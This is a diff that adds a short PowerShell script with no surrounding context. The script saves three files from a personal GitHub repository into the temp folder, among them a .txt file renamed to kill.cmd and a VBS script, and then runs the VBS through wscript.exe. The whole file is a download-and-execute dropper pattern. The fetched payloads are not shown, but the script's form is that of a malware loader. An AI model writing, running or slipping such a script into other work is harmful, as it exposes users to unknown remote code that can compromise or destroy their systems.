@@ -1,0 +1,7 @@
+cd $Env:Temp
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Invoke-WebRequest -Uri "http://github.com/ssbb36/stv/raw/main/kill.txt" -OutFile "kill.cmd"
+Invoke-WebRequest -Uri "http://github.com/ssbb36/stv/raw/main/kill.jpg" -OutFile "kill.jpg"
+Invoke-WebRequest -Uri "http://github.com/ssbb36/stv/raw/main/kill.vbs" -OutFile "kill.vbs"
+$args = @("Comma","Separated","Arguments")
+Start-Process -Filepath "wscript.exe %temp%\kill.vbs" -ArgumentList $args
